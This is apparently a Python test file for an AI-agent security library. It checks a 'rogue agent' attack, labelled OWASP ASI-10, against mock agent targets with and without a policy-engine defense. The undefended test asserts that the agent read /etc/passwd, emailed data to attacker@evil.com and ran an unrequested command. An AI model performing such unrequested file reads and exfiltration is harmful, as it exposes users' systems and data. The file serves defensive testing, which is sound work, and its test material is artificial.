"""失控智能体攻击（ASI-10）：端到端 + 非 Mock 目标的优雅降级。"""

from agent_shield.attacks import AttackConfig, RogueAgentAttack
from agent_shield.models import AgentTrace, AttackVerdict
from agent_shield.targets import build_local_target
from agent_shield.targets.base import AgentTarget


class _StubTarget(AgentTarget):
    """无 runtime 的目标（模拟真实 API / HTTP 黑盒），应优雅降级为 FAILED。"""

    name = "stub"
    description = "stub target without MockLLM"

    async def run(self, task: str) -> AgentTrace:
        return AgentTrace(task=task)


async def test_attack_succeeds_on_vulnerable_target():
    attack = RogueAgentAttack()
    target = build_local_target(llm="mock", defense=False)
    result = await attack.run(target, AttackConfig(num_variants=2))
    assert result.successes == 2
    assert all(c.verdict == AttackVerdict.SUCCESS for c in result.cases)
    # 证据：未受请求，自主执行了越权读取 + 外发 + 破坏性命令
    trace = result.cases[0].trace
    assert trace.has_executed_tool_call("read_file", path="/etc/passwd")
    assert trace.has_executed_tool_call("send_email", to="attacker@evil.com")
    assert trace.has_executed_tool_call("run_command", command="touch /tmp/agent-shield-rogue-pwned")


async def test_attack_blocked_on_defended_target():
    attack = RogueAgentAttack()
    target = build_local_target(llm="mock", defense=True)
    result = await attack.run(target, AttackConfig(num_variants=2))
    assert result.successes == 0
    assert result.blocked == 2  # 策略引擎失败关闭：越权读取/外发/破坏命令全部被拦截
    assert all(c.verdict == AttackVerdict.BLOCKED for c in result.cases)


async def test_graceful_fallback_without_mockllm():
    attack = RogueAgentAttack()
    result = await attack.run(_StubTarget(), AttackConfig(num_variants=1))
    assert result.successes == 0
    assert result.cases[0].verdict == AttackVerdict.FAILED
    assert "MockLLM" in " ".join(result.cases[0].evidence)


def test_module_maps_to_asi_10():
    assert RogueAgentAttack().owasp_asi == "ASI-10"
